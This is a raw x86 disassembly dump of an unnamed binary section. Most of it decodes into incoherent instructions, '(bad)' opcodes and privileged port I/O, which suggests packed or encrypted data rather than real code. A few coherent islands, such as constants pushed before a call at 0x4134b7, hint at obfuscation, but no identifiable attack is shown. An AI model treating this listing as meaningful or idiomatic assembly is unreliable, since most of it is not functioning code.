  41324b:	lea    edx,[ebx+0x649d109b]
  413251:	cmp    BYTE PTR [esi+0xc],cl
  413254:	sahf   
  413255:	cdq    
  413256:	test   al,0xee
  413258:	test   eax,0xca58ea50
  41325d:	mov    ebx,0xe2d3a8f1
  413262:	pop    es
  413263:	add    ch,BYTE PTR [eax+0xfdad537]
  413269:	test   BYTE PTR [ebp-0x47],dl
  41326c:	xchg   DWORD PTR [eax],esi
  41326e:	in     eax,0xba
  413270:	out    0xe6,eax
  413272:	enter  0x3ade,0x8e
  413276:	push   eax
  413277:	sbb    DWORD PTR [ebx],edx
  413279:	ds mov esp,0xeaceb055
  41327f:	cmc    
  413280:	jmp    0x413230
  413282:	jle    0x4132bf
  413284:	repz mov dl,0xd1
  413287:	add    ebp,DWORD PTR [ecx+0x30ee2ed6]
  41328d:	fisub  WORD PTR [edi-0x61]
  413290:	enter  0xa5c,0x1d
  413294:	and    ch,dl
  413296:	pop    esp
  413297:	or     ebp,esp
  413299:	aaa    
  41329a:	sub    eax,0x76104458
  41329f:	xchg   edi,eax
  4132a0:	(bad)  
  4132a1:	sub    ah,cl
  4132a3:	mov    al,ds:0x379314ab
  4132a8:	pop    ecx
  4132a9:	in     al,0x84
  4132ab:	mov    bh,0x18
  4132ad:	sbb    al,0x94
  4132af:	scas   al,BYTE PTR es:[edi]
  4132b0:	mov    fs,WORD PTR [edx+0x60]
  4132b3:	mov    esp,ecx
  4132b5:	ins    DWORD PTR es:[edi],dx
  4132b6:	pop    esp
  4132b7:	xchg   ecx,edx
  4132b9:	iret   
  4132ba:	out    0x51,al
  4132bc:	xor    DWORD PTR [eax+edx*1+0x75e1018a],esp
  4132c3:	jp     0x41332f
  4132c5:	dec    ebx
  4132c6:	data16 mov dh,0xe7
  4132c9:	fwait
  4132ca:	jnp    0x413332
  4132cc:	test   DWORD PTR [esp+edx*4-0x11],edi
  4132d0:	test   al,0x83
  4132d2:	in     al,0xda
  4132d4:	dec    esi
  4132d5:	call   0x3b91:0xa9daccb4
  4132dc:	sub    al,0x3e
  4132de:	shr    BYTE PTR [ebp-0x760a3ce9],1
  4132e4:	inc    esi
  4132e5:	jle    0x413285
  4132e7:	outs   dx,DWORD PTR ds:[esi]
  4132e8:	mov    edx,0xbac3200
  4132ed:	mov    eax,0xc86ccb6c
  4132f2:	in     al,0x4a
  4132f4:	test   al,0x5e
  4132f6:	in     al,0xc4
  4132f8:	xchg   ebp,eax
  4132f9:	mov    al,0xc7
  4132fb:	or     eax,0x2cf0637b
  413300:	or     bh,BYTE PTR [esi-0x2c0de0f]
  413306:	adc    ah,BYTE PTR [edi-0x59]
  413309:	in     al,dx
  41330a:	mov    gs,ebx
  41330c:	sub    dh,BYTE PTR [edx-0x68]
  41330f:	adc    BYTE PTR [ebx+0x68323a5e],dh
  413315:	mov    cs,WORD PTR [eax+0x6a150f24]
  41331b:	imul   ebx,esi,0xb9d7be14
  413321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413322:	mov    DWORD PTR [ebx+0x899fdfc],esp
  413328:	sbb    ch,ch
  41332a:	cmp    dh,BYTE PTR [edx-0x372a3720]
  413330:	xchg   ebx,eax
  413331:	add    bh,BYTE PTR [ecx]
  413333:	cld    
  413334:	xor    al,0xb
  413336:	cld    
  413337:	mov    eax,0x3fb3fe67
  41333c:	pop    edi
  41333d:	imul   ecx,DWORD PTR [esi],0x3c
  413340:	test   DWORD PTR [edx-0xe],esp
  413343:	jbe    0x41331c
  413345:	cmp    ebp,eax
  413347:	add    DWORD PTR [ebx+0x6b1ef2df],eax
  41334d:	jg     0x413377
  41334f:	cmp    dh,BYTE PTR [ecx-0x3f]
  413352:	popf   
  413353:	loopne 0x413345
  413355:	push   ebx
  413356:	push   ebx
  413357:	add    al,BYTE PTR [esi+0xb4a2ec7]
  41335d:	mov    esp,0x2915a190
  413362:	sbb    BYTE PTR [eax+eax*1+0x7c],ch
  413366:	pcmpeqd mm4,QWORD PTR ds:0xef1684f3
  41336d:	aad    0x8b
  41336f:	or     BYTE PTR [ecx-0x77],bl
  413372:	cmp    eax,0x7fc900c3
  413377:	icebp  
  413378:	out    0xca,eax
  41337a:	mov    al,0x4e
  41337c:	cwde   
  41337d:	(bad)  ds:0xcabc2bfc
  413383:	mov    bh,0x6c
  413385:	sahf   
  413386:	sbb    ch,cl
  413388:	bound  edx,QWORD PTR [ecx]
  41338a:	popf   
  41338b:	jb     0x413384
  41338d:	push   es
  41338e:	cmp    dh,BYTE PTR [esi+0x22f77f27]
  413394:	outs   dx,DWORD PTR ds:[esi]
  413395:	outs   dx,DWORD PTR ds:[esi]
  413396:	mov    ds:0x70e948c0,eax
  41339b:	add    ebx,edi
  41339d:	push   0xffffffbc
  41339f:	aaa    
  4133a0:	aas    
  4133a1:	pop    esi
  4133a2:	cmp    al,0x4d
  4133a4:	cmp    eax,0xdb448ee4
  4133a9:	pop    esp
  4133aa:	punpckhdq mm6,QWORD PTR [edi+0x779188a6]
  4133b1:	push   ss
  4133b2:	xor    DWORD PTR [edi-0x19],0xffffffd6
  4133b6:	pop    esi
  4133b7:	push   cs
  4133b8:	in     al,0x7b
  4133ba:	mov    ah,0xbd
  4133bc:	jno    0x4133fe
  4133be:	js     0x4133c6
  4133c0:	jb     0x4133e1
  4133c2:	rol    DWORD PTR [esi-0x3d],cl
  4133c5:	or     BYTE PTR [ebp-0x40ec01ee],0xe
  4133cc:	xor    cl,BYTE PTR [esi+0x1d]
  4133cf:	mov    al,0x6
  4133d1:	sti    
  4133d2:	and    ah,cl
  4133d4:	lods   al,BYTE PTR ds:[esi]
  4133d5:	int    0x77
  4133d7:	call   0xcd4f:0xd0f2a304
  4133de:	lds    esp,FWORD PTR [eax-0x1a0dbaf6]
  4133e4:	stc    
  4133e5:	aas    
  4133e6:	call   0xf367:0x5826f43
  4133ed:	mov    DWORD PTR [ecx+0x536919d],ecx
  4133f3:	sti    
  4133f4:	mov    esi,es
  4133f6:	cdq    
  4133f7:	push   esp
  4133f8:	mov    esi,0xf446f2d7
  4133fd:	fs and eax,0x1b92e7ed
  413403:	add    bl,BYTE PTR [ebx-0x3d7825ed]
  413409:	or     al,0x7a
  41340b:	iret   
  41340c:	int    0xfe
  41340e:	mov    ds:0xa52f4145,eax
  413413:	popf   
  413414:	clc    
  413415:	stc    
  413416:	stc    
  413417:	clc    
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	ja     0x413495
  41341b:	in     eax,dx
  41341c:	pop    edi
  41341d:	inc    ebp
  41341e:	(bad)  
  41341f:	cwde   
  413420:	call   0x86ab93b8
  413425:	lods   eax,DWORD PTR ds:[esi]
  413426:	push   ds
  413427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413428:	cmp    DWORD PTR [ebx+0x12402d96],0x6b66d4c7
  413432:	bound  esp,QWORD PTR [edx]
  413434:	mov    cl,0x46
  413436:	jl     0x4133de
  413438:	cs pop es
  41343a:	mov    eax,DWORD PTR [edx+ecx*1-0x246e44d5]
  413441:	inc    eax
  413442:	dec    ebp
  413443:	xchg   esp,eax
  413444:	xchg   DWORD PTR [edi+0x6],esp
  413447:	pop    DWORD PTR [ebp+0x7f]
  41344a:	dec    edx
  41344b:	mov    bl,0x26
  41344d:	and    edi,DWORD PTR [edi-0x20]
  413450:	add    ah,BYTE PTR [ecx+0x49d180d6]
  413456:	mov    ebx,0x4cf58e13
  41345b:	mov    bh,0xcb
  41345d:	sub    ch,BYTE PTR [edx-0x8]
  413460:	dec    ebp
  413461:	mov    al,0xb7
  413463:	or     eax,0xacc8e80f
  413468:	daa    
  413469:	xor    esi,DWORD PTR [edi+0xe792a74]
  41346f:	ja     0x413458
  413471:	mov    eax,ds:0x818ff1ac
  413476:	aaa    
  413477:	call   0xc484c935
  41347c:	adc    edi,edx
  41347e:	ins    BYTE PTR es:[edi],dx
  41347f:	in     eax,0xf
  413481:	dec    eax
  413482:	lahf   
  413483:	rcl    BYTE PTR [ecx-0x1ef7bb42],0x5c
  41348a:	sbb    cl,BYTE PTR [ebp-0x7]
  41348d:	xor    DWORD PTR ds:0x31c4251b,ecx
  413493:	scas   eax,DWORD PTR es:[edi]
  413494:	sbb    eax,0x5b921a2b
  413499:	bound  edi,QWORD PTR [ebx+0x2e]
  41349c:	aas    
  41349d:	xchg   esp,eax
  41349e:	adc    dl,dh
  4134a0:	push   ss
  4134a1:	and    DWORD PTR [esi],ebp
  4134a3:	adc    eax,0x73d28142
  4134a8:	xchg   ebp,eax
  4134a9:	add    BYTE PTR [eax],al
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x422049
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x3b3c709f]
  4134d4:	aaa    
  4134d5:	push   0x64
  4134d7:	inc    edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    dh,ch
  4134df:	xlat   BYTE PTR ds:[ebx]
  4134e0:	xchg   edx,eax
  4134e1:	es call 0x139d41ef
  4134e7:	or     ecx,DWORD PTR [edx]
  4134e9:	popf   
  4134ea:	jg     0x4134a2
  4134ec:	iret   
  4134ed:	je     0x413499
  4134ef:	out    dx,eax
  4134f0:	mov    WORD PTR [edi-0x2],gs
  4134f3:	jne    0x413556
  4134f5:	pop    ebp
  4134f6:	or     BYTE PTR [edi-0x300120a9],ch
  4134fc:	fild   QWORD PTR [eax+0x97d966]
  413502:	xor    al,0xc
  413504:	mov    edi,0x57f68f0d
  413509:	in     al,dx
  41350a:	jne    0x41351f
  41350c:	scas   eax,DWORD PTR es:[edi]
  41350d:	or     DWORD PTR [eax],edx
  41350f:	das    
  413510:	add    ch,dl
  413512:	pop    es
  413513:	mov    al,ds:0x79dc7a46
  413518:	xchg   BYTE PTR [edi+0x5],ch
  41351b:	test   al,0x43
  41351d:	mov    ebx,0xcd9bd1cc
  413522:	out    0x34,eax
  413524:	cmp    DWORD PTR [esi],esi
  413526:	je     0x4134b3
  413528:	jmp    0x413589
  41352a:	push   edi
  41352b:	mov    ch,0xb0
  41352d:	(bad)  
  41352e:	sti    
  41352f:	cs push cs
  413531:	and    al,BYTE PTR [ebp+0x69fe850f]
  413537:	mov    ebx,0xe31a534b
  41353c:	lods   al,BYTE PTR ds:[esi]
  41353d:	sar    DWORD PTR [ebx],cl
  41353f:	cli    
  413540:	in     eax,0x99
  413542:	inc    eax
  413543:	xor    eax,0x5efb7be0
  413548:	xchg   BYTE PTR [ecx],cl
  41354a:	sub    DWORD PTR [ebx-0x1b],edi
  41354d:	mov    ecx,0xb4ee2d7d
  413552:	imul   ebx,edi,0x35665e67
  413558:	mov    al,ds:0x17ac8afb
  41355d:	push   esi
  41355e:	iret   
  41355f:	xor    DWORD PTR [esi+esi*2-0x5c567dde],ecx
  413566:	jo     0x413532
  413568:	out    dx,eax
  413569:	or     DWORD PTR [ebx+0x5e],ebp
  41356c:	dec    ecx
  41356d:	mov    WORD PTR [edi+0xd],fs
  413570:	enter  0x4e93,0xe1
  413574:	inc    esp
  413575:	xchg   ecx,eax
  413576:	xlat   BYTE PTR ds:[ebx]
  413577:	sbb    ecx,DWORD PTR [ecx+0xa]
  41357a:	xchg   DWORD PTR [eax+0x6d],edx
  41357d:	xchg   edi,eax
  41357e:	cmp    BYTE PTR [edi+0x76d8bd9a],dh
  413584:	int3   
  413585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413586:	jns    0x4135c2
  413588:	xchg   ecx,eax
  413589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41358a:	dec    ebx
  41358b:	stc    
  41358c:	jecxz  0x41359b
  41358e:	jns    0x413605
  413590:	mov    edx,0x71adff3d
  413595:	out    dx,eax
  413596:	int    0x3e
  413598:	(bad)  
  41359a:	cdq    
  41359b:	add    DWORD PTR [ecx],ebx
  41359d:	in     eax,dx
  41359e:	jne    0x4135b9
  4135a0:	addr16 lock add al,0x1
  4135a4:	aad    0xec
  4135a6:	pop    es
  4135a7:	loop   0x4135a2
  4135a9:	push   ss
  4135aa:	jo     0x41354e
  4135ac:	(bad)  
  4135ad:	mov    bh,0x95
  4135af:	sub    edx,esi
  4135b1:	mov    esi,DWORD PTR [ecx+0x4]
  4135b4:	popa   
  4135b5:	sbb    BYTE PTR [ecx+0x36533f85],bh
  4135bb:	leave  
  4135bc:	into   
  4135bd:	push   esi
  4135be:	dec    ebx
  4135bf:	sub    edx,DWORD PTR [ecx]
  4135c1:	push   ebx
  4135c2:	ficomp DWORD PTR [ebx+0x77]
  4135c5:	mov    dh,0x4c
  4135c7:	icebp  
  4135c8:	jo     0x4135b6
  4135ca:	adc    DWORD PTR [ebp+eax*8+0x72],edi
  4135ce:	add    ch,BYTE PTR ds:[ebx]
  4135d1:	push   esp
  4135d2:	xchg   ebx,eax
  4135d3:	cs inc esp
  4135d5:	mov    eax,0x6edccebc
  4135da:	add    DWORD PTR [eax-0x7ae82037],edx
  4135e0:	shl    BYTE PTR gs:[ebx-0x2f],1
  4135e4:	cli    
  4135e5:	cwde   
  4135e6:	fs pop eax
  4135e8:	push   ss
  4135e9:	repz mov esp,esi
  4135ec:	mov    ds,WORD PTR [edi+0x39]
  4135ef:	jns    0x413630
  4135f1:	xor    dl,BYTE PTR [edx+0x7b7e8563]
  4135f7:	jne    0x4135ff
  4135f9:	xor    al,0x65
  4135fb:	into   
  4135fc:	mov    edi,0xc0c2299d
  413601:	cmp    esp,DWORD PTR [edx+0x1b7e4fc2]
  413607:	ss inc edi
  413609:	or     BYTE PTR [esi-0x71e0a921],ch
  41360f:	cs in  al,dx
  413611:	icebp  
  413612:	test   eax,0xb58b4125
  413617:	xchg   ebx,eax
  413618:	js     0x413635
  41361a:	pusha  
  41361b:	out    0xb3,eax
  41361d:	and    al,0x22
  41361f:	arpl   WORD PTR [ecx],si
  413621:	cmp    al,0x26
  413623:	push   cs
  413624:	jmp    0x8dfe:0x29ace13e
  41362b:	mov    esi,0x936aaf4
  413630:	mov    cs,WORD PTR [esi+0x10]
  413633:	gs data16 daa 
  413636:	test   eax,0x496e6a88
  41363b:	xchg   BYTE PTR [edi],dh
  41363d:	dec    ebx
  41363e:	inc    ebp
  41363f:	add    al,0xcf
  413641:	fwait
  413642:	(bad)
  413645:	xor    BYTE PTR [edx],0x82
  413648:	inc    edx
  413649:	xchg   ecx,eax
  41364a:	imul   esp,DWORD PTR [ecx+0x60],0xc214304a
  413651:	and    BYTE PTR [edx+0x5d3c5d67],cl
  413657:	arpl   WORD PTR [ecx],cx
  413659:	daa    
  41365a:	test   eax,0xd9de964
  41365f:	mov    dh,0xa0
  413661:	dec    esi
  413662:	push   edi
  413663:	pop    ecx
  413664:	sub    al,0xbd
  413666:	push   ds
  413667:	popa   
  413668:	add    eax,0x32162d4
  41366d:	mov    ah,0xfe
  41366f:	and    edi,ecx
  413671:	ins    DWORD PTR es:[edi],dx
  413672:	xchg   ah,al
  413674:	sbb    ebp,edi
  413676:	test   DWORD PTR [esp+ecx*8],esi
  413679:	(bad)  
  41367a:	adc    BYTE PTR [ecx+0x551d406e],cl
  413680:	mov    esi,0xb56ebdc4
  413685:	mov    bl,0x2b
  413687:	push   edx
  413688:	dec    ebp
  413689:	cmp    eax,0x415912d9
  41368e:	push   cs
  41368f:	loope  0x41369e
  413691:	sub    eax,0xe15d7e02
  413696:	scas   eax,DWORD PTR es:[edi]
  413697:	or     eax,0xa8a43408
  41369c:	fwait
  41369d:	inc    esi
  41369e:	mov    ebp,ebx
  4136a0:	pop    ebx
  4136a1:	mov    ds:0x6d77b473,al
  4136a6:	pop    es
  4136a7:	popf   
  4136a8:	test   al,0x7a
  4136aa:	pop    esp
  4136ab:	dec    esi
  4136ac:	xor    al,0xc0
  4136ae:	and    dh,al
  4136b0:	jle    0x4136a5
  4136b2:	outs   dx,BYTE PTR ds:[esi]
  4136b3:	inc    edi
  4136b4:	cs and al,0x46
  4136b7:	loope  0x4136fb
  4136b9:	es pop edi
  4136bb:	xor    bh,BYTE PTR cs:[edx+0xc]
  4136bf:	out    0xd4,eax
  4136c1:	fisubr WORD PTR [ecx]
  4136c3:	cli    
  4136c4:	dec    eax
  4136c5:	dec    esp
  4136c6:	push   eax
  4136c7:	addr16 dec eax
  4136c9:	dec    ecx
  4136ca:	sahf   
  4136cb:	lea    edx,[eax-0x729af7a9]
  4136d1:	or     DWORD PTR [ebx],ebp
  4136d3:	add    ebp,DWORD PTR [ebp+edx*1-0x59]
  4136d7:	xchg   ebx,eax
  4136d8:	add    dh,cl
  4136da:	ret    
  4136db:	fistp  WORD PTR [esi+0x6a4a29dc]
  4136e1:	pop    esi
  4136e2:	xchg   DWORD PTR [edi],esi
  4136e4:	push   ds
  4136e5:	rcl    DWORD PTR [edi+0x421f5c64],1
  4136eb:	dec    esp
  4136ec:	inc    edx
  4136ed:	sbb    esi,DWORD PTR [ebx]
  4136ef:	jb     0x41369e
  4136f1:	xor    eax,0x72a338b7
  4136f6:	rcr    cl,cl
  4136f8:	repnz add DWORD PTR [eax+0x513f9ba0],ebp
  4136ff:	dec    bh
  413701:	jle    0x41376a
  413703:	call   0xa97b:0x3a53407d
  41370a:	add    BYTE PTR [ebp-0xc6ebcbe],ah
  413710:	shl    dl,1
  413712:	pop    DWORD PTR [edx+0x57964bdf]
  413718:	dec    edi
  413719:	push   edx
  41371a:	mov    ah,0x15
  41371c:	fistp  DWORD PTR [edi+ecx*2]
  41371f:	xchg   dh,dh
  413721:	mov    dl,0x4c
  413723:	mov    edx,0xccf4b6a5
  413728:	mul    DWORD PTR [ecx+0x53]
  41372b:	jmp    0xae651975
  413730:	dec    eax
  413731:	add    ebp,DWORD PTR [ebx-0x15146c73]
  413737:	ficom  DWORD PTR [esi]
  413739:	mov    ah,0xc
  41373b:	and    BYTE PTR [edi-0x13],cl
  41373e:	or     al,0xb7
  413740:	pop    ss
  413741:	fcmovnu st,st(6)
  413743:	xchg   edi,eax
  413744:	(bad)  
  413745:	fcomp  DWORD PTR [edi-0x4bcb597c]
  41374b:	pop    eax
  41374c:	dec    ebp
  41374d:	pop    edi
  41374e:	dec    ebp
  41374f:	xchg   BYTE PTR [esi],ch
  413751:	sub    ecx,DWORD PTR [esi-0x36]
  413754:	mov    DWORD PTR [ebx],ebp
  413756:	data16 jb 0x4137ce
  413759:	scas   eax,DWORD PTR es:[edi]
  41375a:	jl     0x41375b
  41375c:	rcr    DWORD PTR [ecx+ebp*4+0x7aee4cb0],0xbc
  413764:	mov    bl,0x40
  413766:	jle    0x41370c
  413768:	fnsave [eax]
  41376a:	les    ebp,FWORD PTR [ebx-0x5c52956b]
  413770:	jae    0x413760
  413772:	adc    bh,dl
  413774:	leave  
  413775:	dec    ecx
  413776:	dec    esi
  413777:	aam    0x6d
  413779:	or     esp,eax
  41377b:	rol    BYTE PTR [ecx+eax*8+0x1d],cl
  41377f:	or     al,0xca
  413781:	push   eax
  413782:	cmp    eax,0x86a4a4b2
  413787:	adc    cl,BYTE PTR [esi+0x1c0e8a3c]
  41378d:	sub    eax,0x4c571917
  413792:	loope  0x4137ea
  413794:	inc    esp
  413795:	xchg   edx,eax
  413796:	sar    BYTE PTR [eax-0x20e98a6f],1
  41379c:	pop    ss
  41379d:	dec    ebp
  41379e:	hlt    
  41379f:	clc    
  4137a0:	jne    0x41372c
  4137a2:	ds pop edx
  4137a4:	pop    edi
  4137a5:	retf   0xabcb
  4137a8:	mov    ah,0xf4
  4137aa:	call   0x2c45:0x1d3a8371
  4137b1:	fldcw  WORD PTR [ebx-0xd]
  4137b4:	nop
  4137b5:	std    
  4137b6:	jno    0x413746
  4137b8:	mov    ds:0x874422ab,eax
  4137bd:	leave  
  4137be:	push   0xffffffba
  4137c0:	sar    BYTE PTR [edi],cl
  4137c2:	ret    0x6028
  4137c5:	mov    ds:0x7e3f6c36,al
  4137ca:	leave  
  4137cb:	loop   0x4137ed
  4137cd:	ret    0x76c8
  4137d0:	pop    ebp
  4137d1:	scas   al,BYTE PTR es:[edi]
  4137d2:	xor    DWORD PTR [eax-0xad4496b],0x909799a8
  4137dc:	jmp    0xecd28c57
  4137e1:	mov    ch,0xf6
  4137e3:	cmp    DWORD PTR [edx],ebx
  4137e5:	pop    esp
  4137e6:	fldcw  WORD PTR [edx]
  4137e8:	ja     0x4137a5
  4137ea:	hlt    
  4137eb:	retf   0xe673
  4137ee:	jecxz  0x4137be
  4137f0:	push   ebx
  4137f1:	sbb    al,BYTE PTR es:[esi-0x1e]
  4137f5:	pop    esi
  4137f6:	adc    al,0x5e
  4137f8:	aas    
  4137f9:	daa    
  4137fa:	repnz cmp al,0x49
  4137fd:	or     DWORD PTR [esp+eax*2-0x1a831aaf],edi
  413804:	jp     0x4137fe
  413806:	xchg   esi,eax
  413807:	jno    0x413860
  413809:	dec    eax
  41380a:	pop    esi
  41380b:	int    0x1f
  41380d:	or     ah,BYTE PTR [edx+ebp*1]
  413810:	pop    edx
  413811:	inc    edx
  413812:	pop    ebx
  413813:	outs   dx,BYTE PTR ds:[esi]
  413814:	jne    0x413864
  413816:	lods   eax,DWORD PTR ds:[esi]
  413817:	loopne 0x41387d
  413819:	iret   
  41381a:	sbb    DWORD PTR [ecx],esp
  41381c:	cmp    DWORD PTR [esi-0x1b],ebx
  41381f:	push   es
  413820:	js     0x413829
  413822:	push   edi
  413823:	mov    edx,0xcc51dbf9
  413828:	jae    0x4137cc
  41382a:	push   esi
  41382b:	mov    ecx,0xc3f631bc
  413830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413831:	ret    
  413832:	push   ss
  413833:	mov    edx,0x5269a4a6
  413838:	out    0xc,al
  41383a:	pop    ebx
  41383b:	cmc    
  41383c:	pop    ebx
  41383d:	cs or  eax,0xfa468b83
  413843:	fiadd  DWORD PTR es:[ebp+0x118b2ffa]
  41384a:	shr    BYTE PTR [esi-0x8],1
  41384d:	pop    ebp
  41384e:	daa    
  41384f:	xchg   ebx,eax
  413850:	pop    edx
  413851:	loopne 0x41386d
  413853:	push   esi
  413854:	(bad)  
  413856:	or     DWORD PTR [edi],esi
  413858:	adc    cl,BYTE PTR [edi]
  41385a:	mov    ebx,0x616eb54c
  41385f:	ret    
  413860:	dec    ecx
  413861:	iret   
  413862:	jmp    0xdc35578c
  413867:	aad    0x9c
  413869:	mov    al,ds:0xa0b8da0a
  41386e:	jmp    0xe6ad1449
  413873:	push   esp
  413874:	in     al,0x45
  413876:	idiv   BYTE PTR [edx-0x7e388599]
  41387c:	and    al,0xfb
  41387e:	lods   al,BYTE PTR fs:[esi]
  413880:	aam    0xfe
  413882:	lahf   
  413883:	pop    ebp
  413884:	or     BYTE PTR [eax+0x413da2d3],al
  41388a:	imul   esp,DWORD PTR [esi-0x5c],0xd423bfde
  413891:	inc    esi
  413892:	or     dh,BYTE PTR [esi-0x5ff5de1e]
  413898:	cdq    
  413899:	mov    ebx,DWORD PTR [ebp-0x1c]
  41389c:	xor    ecx,0x1b8b
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x70],ebp
  4138e5:	xchg   esp,eax
  4138e6:	jnp    0x413898
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    BYTE PTR [eax-0x14d05811],ah
  4138f5:	add    eax,0x65d3e66c
  4138fa:	inc    esp
  4138fb:	rcl    DWORD PTR ds:[ecx+eax*1],cl
  4138ff:	fnstsw WORD PTR [esi+eiz*2]
  413902:	stos   DWORD PTR es:[edi],eax
  413903:	or     al,0x95
  413905:	lahf   
  413906:	sub    cl,BYTE PTR [eax-0x5e718375]
  41390c:	aas    
  41390d:	push   esi
  41390e:	jecxz  0x413947
  413910:	ror    DWORD PTR [edx-0xac5a8fb],1
  413916:	pop    ecx
  413917:	data16 hlt 
  413919:	(bad)  
  41391a:	int    0xf1
  41391c:	sub    al,0xd3
  41391e:	test   BYTE PTR ds:0x709ef1d,dh
  413924:	lock stc 
  413926:	adc    esp,esp
  413928:	pop    esi
  413929:	in     eax,0xe
  41392b:	mov    ecx,0xd3f9ca78
  413930:	adc    ch,BYTE PTR [eax+ebx*4-0x3b]
  413934:	adc    DWORD PTR [ebx+0x44],ebx
  413937:	lahf   
  413938:	cld    
  413939:	loope  0x4139b3
  41393b:	imul   ecx,DWORD PTR [eax+0x21f1720d],0x229b9016
  413945:	(bad)  
  413946:	fsubr  st(4),st
  413948:	pcmpeqb mm3,QWORD PTR [eax]
  41394b:	dec    edi
  41394c:	push   ds
  41394d:	xchg   DWORD PTR [esi-0x2e],esi
  413950:	pusha  
  413951:	mov    ebp,DWORD PTR [edx+ecx*4]
  413954:	xchg   ebx,eax
  413955:	(bad)  
  413956:	pushf  
  413957:	dec    ebp
  413958:	mov    ecx,0x65b25684
  41395d:	rcr    ebp,0x70
  413960:	call   0x2e91:0x7a99f689
  413967:	sti    
  413968:	inc    edi
  413969:	push   ss
  41396a:	fwait
  41396b:	dec    ecx
  41396c:	out    0x59,al
  41396e:	push   ds
  41396f:	loope  0x4139b3
  413971:	jns    0x4138ff
  413973:	adc    eax,0x9e013d9c
  413978:	retf   
  413979:	or     BYTE PTR [eax-0x6b2bb71b],cl
  41397f:	ret    
  413980:	cmp    esp,ebp
  413982:	pop    ecx
  413983:	dec    eax
  413984:	gs jecxz 0x413972
  413987:	(bad)  
  413988:	fdiv   QWORD PTR [edi+0x3f]
  41398b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41398c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41398d:	add    al,0x14
  413990:	and    eax,esi
  413992:	call   0xaf74296f
  413997:	add    DWORD PTR [eax+0x16e38e2b],eax
  41399d:	fld    TBYTE PTR ss:[ecx+0x5fe2498e]
  4139a4:	(bad)
  4139a9:	int    0x8b
  4139ab:	outs   dx,BYTE PTR ds:[esi]
  4139ac:	ja     0x413972
  4139ae:	pop    esp
  4139af:	pop    eax
  4139b0:	lahf   
  4139b1:	or     DWORD PTR [ebx],eax
  4139b3:	dec    eax
  4139b4:	(bad)  
  4139b5:	leave  
  4139b6:	cmp    dl,bh
  4139b8:	(bad)  
  4139b9:	pushf  
  4139ba:	or     eax,0x767fa78d
  4139bf:	nop
  4139c0:	ss mov esp,0xb28c0b5b
  4139c6:	push   cs
  4139c7:	sub    edx,DWORD PTR [edx+0x7d3e67e1]
  4139cd:	xor    eax,0xfffffff2
  4139d0:	in     eax,dx
  4139d1:	sar    BYTE PTR [edi+ebx*1+0x196ab97a],0x99
  4139d9:	aad    0xdf
  4139db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139dc:	sbb    eax,0x35d9a1ce
  4139e1:	jecxz  0x41399a
  4139e3:	inc    edi
  4139e4:	sub    dl,BYTE PTR [edx]
  4139e6:	cwde   
  4139e7:	mov    bl,BYTE PTR [edx+0x11e99daa]
  4139ed:	jg     0x4139c6
  4139ef:	lea    esi,[eax+0x67]
  4139f2:	dec    ebx
  4139f3:	and    eax,0xd0dc2ad2
  4139f8:	jnp    0x413a76
  4139fa:	call   0x11bd:0xdf9d352f
  413a01:	pushf  
  413a02:	sub    eax,0xc88be700
  413a07:	push   esp
  413a08:	retf   0x104e
  413a0b:	mov    bh,0xd
  413a0d:	lods   al,BYTE PTR ds:[esi]
  413a0e:	aas    
  413a0f:	adc    ah,0xa3
  413a12:	fmul   DWORD PTR [ebp+0x20]
  413a15:	dec    ebx
  413a16:	xchg   ecx,eax
  413a17:	iret   
  413a18:	popa   
  413a19:	inc    edx
  413a1a:	aaa    
  413a1b:	stc    
  413a1c:	dec    esi
  413a1d:	ds call 0xc6d3:0xbfcab8c1
  413a25:	lods   eax,DWORD PTR ds:[esi]
  413a26:	mov    esp,0x50a0b62a
  413a2b:	scas   eax,DWORD PTR es:[edi]
  413a2c:	fwait
  413a2d:	dec    esp
  413a2e:	sub    BYTE PTR [eax],ch
  413a30:	loope  0x4139b3
  413a32:	pop    edi
  413a33:	mov    BYTE PTR [ebp+0x5494b46d],cl
  413a39:	xchg   edi,eax
  413a3a:	xchg   edi,eax
  413a3b:	jge    0x413a24
  413a3d:	leave  
  413a3e:	(bad)  
  413a3f:	or     al,BYTE PTR [edi-0x33fa0d14]
  413a45:	nop
  413a46:	pop    esi
